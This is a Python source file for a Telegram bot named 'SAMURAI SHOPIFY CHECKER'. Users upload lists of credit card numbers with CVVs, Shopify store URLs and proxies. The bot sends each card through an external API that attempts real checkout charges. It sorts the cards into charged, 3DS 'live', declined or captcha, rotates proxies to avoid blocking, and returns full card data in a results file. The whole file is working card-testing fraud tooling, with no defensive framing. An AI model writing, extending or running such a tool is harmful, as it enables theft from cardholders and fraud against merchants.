# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN TERMUX ADAPTADA PARA RAILWAY
MISMA FUNCIONALIDAD, SOLO CAMBIA EL TOKEN A VARIABLE DE ENTORNO
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import signal
import sys

from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import aiohttp

# ================== CONFIGURACIÓN ==================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CONFIGURACIÓN ==================
class Settings:
    """Configuración global del bot - VERSIÓN RAILWAY (MISMA QUE TERMUX)"""
    # 🔴 TOKEN DEL BOT (LEÍDO DESDE VARIABLE DE ENTORNO EN RAILWAY)
    TOKEN = os.environ.get("BOT_TOKEN")
    if not TOKEN:
        raise ValueError("❌ ERROR: BOT_TOKEN no está configurado en Railway")
    
    # API endpoints (la misma que usa tu otro bot)
    API_ENDPOINTS = [
        "https://auto-shopify-api-production.up.railway.app/index.php",
        "https://auto-shopify-api-production.up.railway.app/index.php",
        "https://auto-shopify-api-production.up.railway.app/index.php",
    ]

    DB_FILE = "bot_samurai.db"
    
    # Timeouts
    TIMEOUT_CONFIG = {
        "connect": 10,
        "sock_read": 45,
        "total": None,
        "response_body": 45,
    }
    
    # Configuración de concurrencia
    CONCURRENT_LIMIT = 3  # Procesar 3 tarjetas en paralelo

# ================== CLASIFICADOR SAMURAI ==================
class SamuraiClassifier:
    """
    Clasifica respuestas según la API de SAMURAI:
    ✅ Thank You $XX.XX ➔ CHARGED
    🔒 3DS / 3D_AUTHENTICATION ➔ 3DS Required (se cuenta como LIVE)
    ❌ GENERIC_DECLINE ➔ DECLINED
    💸 INSUFFICIENT_FUNDS ➔ DECLINED
    🤖 CAPTCHA_REQUIRED ➔ DECLINED (pero se marca como bloqueo)
    """
    
    @staticmethod
    def classify(response_text: str, status_code: int) -> Dict:
        """
        Retorna: {
            "status": "CHARGED" | "3DS" | "DECLINED" | "CAPTCHA" | "UNKNOWN",
            "type": "charge" | "3ds" | "decline" | "block",
            "amount": "$XX.XX" o None,
            "raw_response": respuesta truncada
        }
        """
        response_lower = response_text.lower()
        
        # 1️⃣ DETECTAR CHARGED (Thank You con monto)
        thank_you_pattern = r'thank\s*you.*?\$?(\d+\.\d{2})'
        thank_match = re.search(thank_you_pattern, response_lower, re.IGNORECASE)
        if thank_match and "thank" in response_lower:
            amount = f"${thank_match.group(1)}"
            return {
                "status": "CHARGED",
                "type": "charge",
                "amount": amount,
                "emoji": "✅",
                "raw_response": response_text[:200]
            }
        
        # 2️⃣ DETECTAR 3DS
        if "3ds" in response_lower or "3d_authentication" in response_lower or "3d secure" in response_lower:
            return {
                "status": "3DS",
                "type": "3ds",
                "amount": None,
                "emoji": "🔒",
                "raw_response": response_text[:200]
            }
        
        # 3️⃣ DETECTAR INSUFFICIENT FUNDS
        if "insufficient_funds" in response_lower or "insufficient funds" in response_lower:
            return {
                "status": "DECLINED",
                "type": "decline",
                "amount": None,
                "emoji": "💸",
                "raw_response": response_text[:200],
                "reason": "insufficient_funds"
            }
        
        # 4️⃣ DETECTAR CAPTCHA
        if "captcha_required" in response_lower or "captcha" in response_lower:
            return {
                "status": "CAPTCHA",
                "type": "block",
                "amount": None,
                "emoji": "🤖",
                "raw_response": response_text[:200]
            }
        
        # 5️⃣ DETECTAR GENERIC DECLINE
        if "generic_decline" in response_lower or "declined" in response_lower:
            return {
                "status": "DECLINED",
                "type": "decline",
                "amount": None,
                "emoji": "❌",
                "raw_response": response_text[:200],
                "reason": "generic_decline"
            }
        
        # 6️⃣ Por código HTTP
        if status_code == 200:
            # Si es 200 pero no hay patrones claros
            return {
                "status": "UNKNOWN",
                "type": "unknown",
                "amount": None,
                "emoji": "❓",
                "raw_response": response_text[:200]
            }
        elif status_code >= 400:
            return {
                "status": "ERROR",
                "type": "error",
                "amount": None,
                "emoji": "⚠️",
                "raw_response": f"HTTP {status_code}"
            }
        
        return {
            "status": "UNKNOWN",
            "type": "unknown",
            "amount": None,
            "emoji": "❓",
            "raw_response": response_text[:200]
        }

# ================== DETECTOR INTELIGENTE DE LÍNEAS ==================
class LineDetector:
    """Detecta automáticamente si una línea es SITE, PROXY o CARD"""
    
    @staticmethod
    def detect(line: str) -> Tuple[str, Optional[str]]:
        line = line.strip()
        if not line:
            return None, None

        # 1️⃣ DETECCIÓN DE SITES (URLs)
        if line.startswith(('http://', 'https://')):
            rest = line.split('://')[1]
            if '.' in rest and not rest.startswith('.') and ' ' not in rest:
                return 'site', line
        
        if not line.startswith(('http://', 'https://')):
            domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$'
            if re.match(domain_pattern, line):
                return 'site', f"https://{line}"

        # 2️⃣ DETECCIÓN DE PROXIES
        if not line.startswith(('http://', 'https://')):
            parts = line.split(':')
            
            if len(parts) == 2:
                host, port = parts
                if port.isdigit() and 1 <= int(port) <= 65535:
                    if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                        return 'proxy', line
            
            elif len(parts) == 4:
                host, port, user, password = parts
                if port.isdigit() and 1 <= int(port) <= 65535:
                    if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                        return 'proxy', line
            
            elif len(parts) == 3 and parts[2] == '':
                host, port, _ = parts
                if port.isdigit() and 1 <= int(port) <= 65535:
                    if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                        return 'proxy', f"{host}:{port}::"

        # 3️⃣ DETECCIÓN DE TARJETAS
        if '|' in line:
            parts = line.split('|')
            if len(parts) == 4:
                numero, mes, año, cvv = parts
                if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
                    mes.isdigit() and 1 <= int(mes) <= 12 and
                    año.isdigit() and len(año) in (2, 4) and
                    cvv.isdigit() and len(cvv) in (3, 4)):
                    return 'card', line

        # 4️⃣ DETECCIÓN DE TARJETAS CON ESPACIOS
        if ' ' in line and '|' not in line:
            parts = line.replace(' ', '').split('|')
            if len(parts) == 4:
                numero, mes, año, cvv = parts
                if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
                    mes.isdigit() and 1 <= int(mes) <= 12 and
                    año.isdigit() and len(año) in (2, 4) and
                    cvv.isdigit() and len(cvv) in (3, 4)):
                    return 'card', f"{numero}|{mes}|{año}|{cvv}"

        return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self):
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]'
                )
            ''')
            conn.commit()
        logger.info("✅ Base de datos inicializada")
    
    def get_user_data(self, user_id: int) -> Dict:
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT sites, proxies, cards FROM users WHERE user_id = ?", (user_id,))
            row = cursor.fetchone()
            
            if not row:
                cursor.execute("INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                             (user_id, '[]', '[]', '[]'))
                conn.commit()
                return {"sites": [], "proxies": [], "cards": []}
            
            return {
                "sites": json.loads(row[0]),
                "proxies": json.loads(row[1]),
                "cards": json.loads(row[2])
            }
    
    def _save(self, user_id: int, data: Dict):
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET sites = ?, proxies = ?, cards = ? WHERE user_id = ?",
                (json.dumps(data["sites"]), json.dumps(data["proxies"]), json.dumps(data["cards"]), user_id)
            )
            conn.commit()
    
    def add_items(self, user_id: int, sites: List[str], proxies: List[str], cards: List[str]) -> Dict:
        data = self.get_user_data(user_id)
        
        sites_added = 0
        for site in sites:
            if site not in data["sites"]:
                data["sites"].append(site)
                sites_added += 1
        
        proxies_added = 0
        for proxy in proxies:
            if proxy not in data["proxies"]:
                data["proxies"].append(proxy)
                proxies_added += 1
        
        cards_added = 0
        for card in cards:
            if card not in data["cards"] and CardValidator.parse_card(card):
                data["cards"].append(card)
                cards_added += 1
        
        if sites_added > 0 or proxies_added > 0 or cards_added > 0:
            self._save(user_id, data)
        
        return {
            "sites": sites_added,
            "proxies": proxies_added,
            "cards": cards_added
        }
    
    def get_cards_parsed(self, user_id: int) -> List[Dict]:
        data = self.get_user_data(user_id)
        cards = []
        for card_str in data["cards"]:
            card_data = CardValidator.parse_card(card_str)
            if card_data:
                cards.append(card_data)
        return cards
    
    # ========== MÉTODOS PARA ELIMINAR ==========
    def remove_all_sites(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["sites"])
        data["sites"] = []
        self._save(user_id, data)
        return count
    
    def remove_all_proxies(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["proxies"])
        data["proxies"] = []
        self._save(user_id, data)
        return count
    
    def remove_all_cards(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["cards"])
        data["cards"] = []
        self._save(user_id, data)
        return count

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            if exp_year < now.year:
                return False
            if exp_year == now.year and exp_month < now.month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:],
            "full": card_str
        }

# ================== VERIFICADOR CON PROXY ROTATIVO ==================
class SamuraiChecker:
    @staticmethod
    async def check_card(card_data: Dict, site: str, proxy: str, session: aiohttp.ClientSession) -> Dict:
        """Verifica una tarjeta usando la API con sesión compartida"""
        
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        api_endpoint = random.choice(Settings.API_ENDPOINTS)
        
        # Configurar proxy
        proxy_parts = proxy.split(':')
        proxy_url = None
        proxy_display = proxy
        
        if len(proxy_parts) == 4:
            proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            proxy_display = f"{proxy_parts[0]}:{proxy_parts[1]}"
        elif len(proxy_parts) == 2:
            proxy_url = f"http://{proxy}"
            proxy_display = proxy
        
        timeout = aiohttp.ClientTimeout(
            total=None,
            connect=Settings.TIMEOUT_CONFIG["connect"],
            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
        )
        
        start_time = time.time()
        
        try:
            if proxy_url:
                async with session.get(api_endpoint, params=params, proxy=proxy_url, timeout=timeout) as resp:
                    response_text = await resp.text()
                    elapsed = time.time() - start_time
            else:
                async with session.get(api_endpoint, params=params, timeout=timeout) as resp:
                    response_text = await resp.text()
                    elapsed = time.time() - start_time
            
            # Clasificar con SAMURAI
            classification = SamuraiClassifier.classify(response_text, resp.status)
            
            return {
                "success": classification["status"] in ["CHARGED", "3DS"],  # 3DS se considera LIVE
                "status": classification["status"],
                "type": classification["type"],
                "emoji": classification["emoji"],
                "amount": classification.get("amount"),
                "reason": classification.get("reason", classification["status"]),
                "status_code": resp.status,
                "response": response_text,
                "time": round(elapsed, 2),
                "site": site,
                "proxy": proxy_display,
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str,
                "raw_classification": classification
            }
            
        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            return {
                "success": False,
                "status": "TIMEOUT",
                "type": "error",
                "emoji": "⏱️",
                "error": "timeout",
                "time": round(elapsed, 2),
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str
            }
        except Exception as e:
            elapsed = time.time() - start_time
            return {
                "success": False,
                "status": "ERROR",
                "type": "error",
                "emoji": "⚠️",
                "error": str(e)[:100],
                "time": round(elapsed, 2),
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str
            }

# ================== FUNCIÓN PARA BARRA DE PROGRESO ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    """Crea una barra de progreso visual como [██████░░░░]"""
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

# ================== VARIABLES GLOBALES ==================
db = Database()
active_mass = {}  # user_id -> bool para control de proceso

# ================== COMANDOS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start"""
    await update.message.reply_text(
        "🔥 *SAMURAI SHOPIFY CHECKER 3x*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "*CLASIFICACIÓN SAMURAI:*\n"
        "✅ Thank You $XX.XX ➔ CHARGED\n"
        "🔒 3DS / 3D_AUTHENTICATION ➔ 3DS (LIVE)\n"
        "❌ GENERIC_DECLINE ➔ DECLINED\n"
        "💸 INSUFFICIENT_FUNDS ➔ DECLINED\n"
        "🤖 CAPTCHA_REQUIRED ➔ BLOQUEADO\n\n"
        "*⚡ MODO CONCURRENTE:*\n"
        "• Procesa 3 tarjetas en paralelo\n"
        "• Proxies y sitios rotativos\n"
        "• Barra de progreso en tiempo real\n\n"
        "*📌 COMANDOS:*\n"
        "• Envía un archivo `.txt` con sitios, proxies y tarjetas\n"
        "• El bot detecta automáticamente cada tipo\n"
        "• `/mass` - Iniciar mass check 3x\n"
        "• `/sites` - Listar sitios\n"
        "• `/proxies` - Listar proxies\n"
        "• `/cards` - Listar tarjetas\n"
        "• `/rmsite all` - Borrar sitios\n"
        "• `/rmproxy all` - Borrar proxies\n"
        "• `/rmcard all` - Borrar tarjetas\n"
        "• `/stop` - Detener mass check",
        parse_mode="Markdown"
    )

# ================== MANEJO DE ARCHIVOS CON DETECCIÓN ==================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Por favor, envía un archivo .txt")
        return
    
    msg = await update.message.reply_text("🔄 Analizando archivo...")
    
    file = await context.bot.get_file(document.file_id)
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    lines = text.splitlines()
    
    sites = []
    proxies = []
    cards = []
    unknown = []
    
    for raw_line in lines:
        line = raw_line.strip()
        if not line:
            continue
        
        line_type, normalized = LineDetector.detect(line)
        
        if line_type == 'site':
            sites.append(normalized)
        elif line_type == 'proxy':
            proxies.append(normalized)
        elif line_type == 'card':
            if CardValidator.parse_card(normalized):
                cards.append(normalized)
            else:
                unknown.append(line)
        else:
            unknown.append(line)
    
    added = db.add_items(user_id, sites, proxies, cards)
    
    response = []
    response.append("📊 *ANÁLISIS SAMURAI*\n━━━━━━━━━━━━━━━━━━\n")
    
    if sites:
        response.append(f"🌐 *SITIOS:* {len(sites)} (nuevos: {added['sites']})")
    if proxies:
        response.append(f"🔌 *PROXIES:* {len(proxies)} (nuevos: {added['proxies']})")
    if cards:
        response.append(f"💳 *TARJETAS:* {len(cards)} (nuevas: {added['cards']})")
    if unknown:
        response.append(f"⚠️ *IGNORADAS:* {len(unknown)} líneas")
    
    await msg.edit_text("\n".join(response), parse_mode="Markdown")

# ================== COMANDOS DE LISTADO ==================
async def list_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = db.get_user_data(user_id)
    
    if not data["sites"]:
        await update.message.reply_text("📭 No tienes sitios guardados")
        return
    
    sites = "\n".join([f"{i}. {s}" for i, s in enumerate(data["sites"], 1)])
    await update.message.reply_text(
        f"📋 *SITIOS* ({len(data['sites'])})\n━━━━━━━━━━━━━━━━━━\n\n{sites}",
        parse_mode="Markdown"
    )

async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = db.get_user_data(user_id)
    
    if not data["proxies"]:
        await update.message.reply_text("📭 No tienes proxies guardados")
        return
    
    proxies = []
    for i, p in enumerate(data["proxies"], 1):
        parts = p.split(':')
        if len(parts) == 4:
            proxies.append(f"{i}. `{parts[0]}:{parts[1]}` (auth)")
        else:
            proxies.append(f"{i}. `{p}`")
    
    await update.message.reply_text(
        f"📋 *PROXIES* ({len(data['proxies'])})\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(proxies),
        parse_mode="Markdown"
    )

async def list_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = db.get_user_data(user_id)
    
    if not data["cards"]:
        await update.message.reply_text("📭 No tienes tarjetas guardadas")
        return
    
    cards = []
    for i, c in enumerate(data["cards"], 1):
        parts = c.split('|')
        cards.append(f"{i}. `{parts[0][:6]}xxxxxx{parts[0][-4:]}|{parts[1]}|{parts[2]}|{parts[3]}`")
    
    await update.message.reply_text(
        f"📋 *TARJETAS* ({len(data['cards'])})\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(cards),
        parse_mode="Markdown"
    )

# ================== COMANDOS DE ELIMINACIÓN ==================
async def remove_all_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = db.remove_all_sites(user_id)
    await update.message.reply_text(f"🗑️ Eliminados {count} sitio(s)")

async def remove_all_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = db.remove_all_proxies(user_id)
    await update.message.reply_text(f"🗑️ Eliminados {count} proxy(s)")

async def remove_all_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = db.remove_all_cards(user_id)
    await update.message.reply_text(f"🗑️ Eliminadas {count} tarjeta(s)")

# ================== COMANDO MASS 3x CONCURRENTE ==================
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_mass and active_mass[user_id]:
        await update.message.reply_text("❌ Ya hay un mass check en curso. Usa /stop para cancelarlo.")
        return
    
    user_data = db.get_user_data(user_id)
    
    if not user_data["sites"]:
        await update.message.reply_text("❌ Primero agrega sitios")
        return
    
    if not user_data["proxies"]:
        await update.message.reply_text("❌ Primero agrega proxies")
        return
    
    cards = db.get_cards_parsed(user_id)
    
    if not cards:
        await update.message.reply_text("❌ No tienes tarjetas guardadas.")
        return
    
    active_mass[user_id] = True
    
    # Mensaje inicial
    progress_bar = create_progress_bar(0, len(cards))
    msg = await update.message.reply_text(
        f"🔥 *SAMURAI MASS CHECK 3x CONCURRENTE*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Tarjetas: {len(cards)}\n"
        f"⚡ En paralelo: 3\n"
        f"🔄 Sitios rotativos: {len(user_data['sites'])}\n"
        f"🔄 Proxies rotativos: {len(user_data['proxies'])}\n\n"
        f"Progreso: {progress_bar} 0/{len(cards)}\n"
        f"✅ CHARGED: 0\n"
        f"🔒 3DS: 0\n"
        f"❌ DECLINED: 0\n"
        f"🤖 CAPTCHA: 0\n"
        f"⏱️ ERRORES: 0\n\n"
        f"⏳ Iniciando..."
    )
    
    results = []
    start_time = time.time()
    
    # Contadores
    charged = 0
    three_ds = 0
    declined = 0
    captcha = 0
    errors = 0
    
    # Índices para rotación
    site_index = 0
    proxy_index = 0
    
    # Configurar connector para optimizar conexiones
    connector = aiohttp.TCPConnector(limit=Settings.CONCURRENT_LIMIT, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        total_cards = len(cards)
        processed = 0
        
        # Procesar en lotes de 3
        for i in range(0, total_cards, Settings.CONCURRENT_LIMIT):
            if not active_mass.get(user_id, True):
                await update.message.reply_text("⏹ Mass check detenido por el usuario")
                break
            
            batch = cards[i:i+Settings.CONCURRENT_LIMIT]
            batch_size = len(batch)
            
            # Preparar tareas con rotación de sitios y proxies
            tasks = []
            for card in batch:
                # Rotar sitios
                site = user_data["sites"][site_index % len(user_data["sites"])]
                site_index += 1
                
                # Rotar proxies
                proxy = user_data["proxies"][proxy_index % len(user_data["proxies"])]
                proxy_index += 1
                
                tasks.append(SamuraiChecker.check_card(card, site, proxy, session))
            
            # Ejecutar lote de 3 en paralelo
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Procesar resultados
            for result in batch_results:
                if isinstance(result, Exception):
                    # Si hubo error en la tarea
                    results.append({
                        "success": False,
                        "status": "ERROR",
                        "emoji": "⚠️",
                        "card": "desconocida"
                    })
                    errors += 1
                else:
                    results.append(result)
                    
                    # Actualizar contadores según clasificación SAMURAI
                    if result.get("status") == "CHARGED":
                        charged += 1
                    elif result.get("status") == "3DS":
                        three_ds += 1
                    elif result.get("status") == "CAPTCHA":
                        captcha += 1
                    elif result.get("status") in ["DECLINED", "INSUFFICIENT_FUNDS"]:
                        declined += 1
                    else:
                        errors += 1
            
            processed += batch_size
            
            # ACTUALIZAR PROGRESO DESPUÉS DE CADA LOTE
            progress_bar = create_progress_bar(processed, total_cards)
            last_result = results[-1] if results else None
            last_text = f"{last_result.get('emoji', '❓')} {last_result.get('card', '')}" if last_result else ""
            
            try:
                await msg.edit_text(
                    f"🔥 *SAMURAI MASS CHECK 3x CONCURRENTE*\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"Progreso: {progress_bar} {processed}/{total_cards}\n"
                    f"⚡ En paralelo: 3\n"
                    f"✅ CHARGED: {charged}\n"
                    f"🔒 3DS: {three_ds}\n"
                    f"❌ DECLINED: {declined}\n"
                    f"🤖 CAPTCHA: {captcha}\n"
                    f"⏱️ ERRORES: {errors}\n\n"
                    f"📌 Última: {last_text}\n\n"
                    f"⏳ Procesando..."
                )
            except Exception as e:
                logger.error(f"Error actualizando mensaje: {e}")
                # Si falla la edición, intentamos con un mensaje nuevo
                try:
                    msg = await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"🔄 Continuando... ({processed}/{total_cards})"
                    )
                except:
                    pass
    
    elapsed = time.time() - start_time
    active_mass[user_id] = False
    
    # Generar archivo de resultados
    filename = f"samurai_3x_results_{user_id}_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"SAMURAI 3x MASS CHECK RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {len(cards)}\n")
        f.write(f"Procesadas: {len(results)}\n")
        f.write(f"Modo: 3 en paralelo\n")
        f.write(f"Tiempo total: {elapsed:.2f}s\n")
        f.write(f"✅ CHARGED: {charged}\n")
        f.write(f"🔒 3DS: {three_ds}\n")
        f.write(f"❌ DECLINED: {declined}\n")
        f.write(f"🤖 CAPTCHA: {captcha}\n")
        f.write(f"⏱️ ERRORES: {errors}\n")
        f.write("="*80 + "\n\n")
        
        for i, r in enumerate(results, 1):
            f.write(f"[{i}] {r.get('emoji', '❓')} TARJETA: {r.get('card', 'desconocida')}\n")
            f.write(f"    COMPLETA: {r.get('full_card', 'N/A')}\n")
            f.write(f"    ESTADO: {r.get('status', 'UNKNOWN')}\n")
            if r.get('amount'):
                f.write(f"    MONTO: {r['amount']}\n")
            f.write(f"    SITIO: {r.get('site', 'N/A')}\n")
            f.write(f"    PROXY: {r.get('proxy', 'N/A')}\n")
            f.write(f"    TIEMPO: {r.get('time', 0)}s\n")
            f.write(f"    HTTP: {r.get('status_code', 0)}\n")
            f.write(f"    RESPUESTA API:\n{r.get('response', 'N/A')[:500]}\n")
            f.write("-"*40 + "\n\n")
    
    with open(filename, "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption=f"🔥 Resultados SAMURAI 3x - {len(results)} tarjetas en {elapsed:.1f}s"
        )
    
    os.remove(filename)
    
    # Mensaje final
    final_bar = create_progress_bar(len(results), len(cards))
    speed = len(results) / elapsed if elapsed > 0 else 0
    await update.message.reply_text(
        f"✅ *MASS CHECK 3x COMPLETADO*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Progreso: {final_bar} {len(results)}/{len(cards)}\n"
        f"⚡ Velocidad: {speed:.1f} tarjetas/segundo\n"
        f"✅ CHARGED: {charged}\n"
        f"🔒 3DS: {three_ds}\n"
        f"❌ DECLINED: {declined}\n"
        f"🤖 CAPTCHA: {captcha}\n"
        f"⏱️ ERRORES: {errors}\n"
        f"⏱️ Tiempo total: {elapsed:.2f}s\n\n"
        f"📎 Archivo con resultados enviado.",
        parse_mode="Markdown"
    )

async def stop_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_mass and active_mass[user_id]:
        active_mass[user_id] = False
        await update.message.reply_text("⏹ Deteniendo mass check...")
    else:
        await update.message.reply_text("No hay mass check activo.")

# ================== MAIN ==================
def main():
    print("🔥 SAMURAI SHOPIFY CHECKER 3x CONCURRENTE")
    print("📁 Base de datos: bot_samurai.db")
    print("⚡ Procesando 3 tarjetas en paralelo")
    print("🔄 Proxies y sitios rotativos")
    print("🚀 Bot iniciado...")
    
    app = Application.builder().token(Settings.TOKEN).build()
    
    # Comandos
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sites", list_sites))
    app.add_handler(CommandHandler("proxies", list_proxies))
    app.add_handler(CommandHandler("cards", list_cards))
    app.add_handler(CommandHandler("rmsite", remove_all_sites))
    app.add_handler(CommandHandler("rmproxy", remove_all_proxies))
    app.add_handler(CommandHandler("rmcard", remove_all_cards))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("stop", stop_mass))
    
    # Handler de archivos
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Bot detenido")
        sys.exit(0)
